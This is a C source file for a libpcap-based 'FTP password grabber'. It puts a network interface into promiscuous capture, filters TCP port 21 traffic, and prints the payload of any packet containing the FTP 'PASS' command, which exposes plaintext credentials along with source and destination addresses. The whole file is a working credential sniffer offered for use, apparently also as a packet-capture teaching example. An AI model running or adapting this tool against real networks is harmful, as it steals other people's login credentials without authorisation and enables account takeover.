/* Simple Simple FTP Password grabber.                                   */
/* Author: Luis Martin Garcia. luis.martingarcia [.at.] gmail [d0t] com  */
/* To compile: gcc ftp_grabber.c -o ftpgrabber -lpcap                    */
/* Run as root!                                                          */
/*                                                                       */
/* This code is distributed under the GPL License. For more info check:  */
/* http://www.gnu.org/copyleft/gpl.html                                  */



#define __USE_BSD         /* Using BSD IP header           */ 
#include <netinet/ip.h>   /* Internet Protocol             */ 
#define __FAVOR_BSD       /* Using BSD TCP header          */ 
#include <netinet/tcp.h>  /* Transmission Control Protocol */ 
#include <pcap.h>         /* Libpcap                       */ 
#include <string.h>       /* String operations             */ 
#include <stdlib.h>       /* Standard library definitions  */ 

#define MAXBYTES2CAPTURE 2048


/* main(): Main function. Opens network interface for capture. Tells the kernel*/
/* to capture TCP packets to or from port 21. Looks for the string PASS into   */
/* packet payload. If string is found packet payload is printed to stdout.     */
int main(int argc, char *argv[] ){
 
 int count=0, i=0;
 bpf_u_int32 netaddr=0, mask=0;    /* To Store network address and netmask   */ 
 struct bpf_program filter;        /* Place to store the BPF filter program  */ 
 char errbuf[PCAP_ERRBUF_SIZE];    /* Error buffer                           */ 
 pcap_t *descr = NULL;             /* Network interface handler              */ 
 struct pcap_pkthdr pkthdr;        /* Packet information (timestamp,size...) */ 
 const unsigned char *packet=NULL; /* Received raw data                      */ 
 struct ip *iphdr = NULL;          /* IPv4 Header                            */
 struct tcphdr *tcphdr = NULL;     /* TCP Header                             */
 memset(errbuf,0,PCAP_ERRBUF_SIZE);

   
if (argc != 2){
	fprintf(stderr, "USAGE: ftpgrabber <interface>\n");
	exit(1);
}

 /* Open network device for packet capture */ 
 descr = pcap_open_live(argv[1], MAXBYTES2CAPTURE, 1,  512, errbuf);
 if(descr==NULL){
   fprintf(stderr, "pcap_open_live(): %s \n", errbuf);
   exit(1);
 }

 /* Look up info from the capture device. */ 
 if ( pcap_lookupnet( argv[1] , &netaddr, &mask, errbuf) == -1 ){ 
   fprintf(stderr, "ERROR: pcap_lookupnet(): %s\n", errbuf );
   exit(1);
 }

 /* Compiles the filter expression into a BPF filter program */
 if ( pcap_compile(descr, &filter, "tcp port 21", 1, mask) == -1){
    fprintf(stderr, "Error in pcap_compile(): %s\n", pcap_geterr(descr) );
    exit(1);
 }
 
 /* Load the filter program into the packet capture device. */ 
 if( pcap_setfilter(descr,&filter) == -1 ){
    fprintf(stderr, "Error in pcap_setfilter(): %s\n", pcap_geterr(descr));
    exit(1);
 }



 while(1){ 
  /* Get one packet */
  if ( (packet = pcap_next(descr,&pkthdr)) == NULL){
    fprintf(stderr, "Error in pcap_next()\n", errbuf);
    exit(1);
  }

  if(strstr(packet+14+20+20, "PASS") ){ /* Does packet contain string "PASS"? */
      
    iphdr = (struct ip *)(packet+14);
    tcphdr = (struct tcphdr *)(packet+14+20);
    if(count==0)printf("+----------------------------------------------+\n"); 
    printf("-> Received Packet No.%d:\n", ++count);
    printf("   DST IP: %s\n", inet_ntoa(iphdr->ip_dst)); 
    printf("   SRC IP: %s\n", inet_ntoa(iphdr->ip_src)); 
    printf("   SRC PORT: %d\n", ntohs(tcphdr->th_sport) ); 
    printf("   DST PORT: %d\n", ntohs(tcphdr->th_dport) ); 
    printf("   PACKET PAYLOAD:\n   "); 

    for (i=0; i<pkthdr.len; i++){ 

        if ( isprint(packet[i]) ) /* If it is a printable character, print it */
            printf("%c ", packet[i]); 
        else 
            printf(". "); 
    
        if( (i%16 == 0 && i!=0) || i==pkthdr.len-1 ) 
            printf("\n   "); 
    }
    printf("\n+----------------------------------------------+\n");  
    memset((void *)packet, 0, pkthdr.len); /* Clean the buffer */
  }
}



return 0;

}

/* EOF */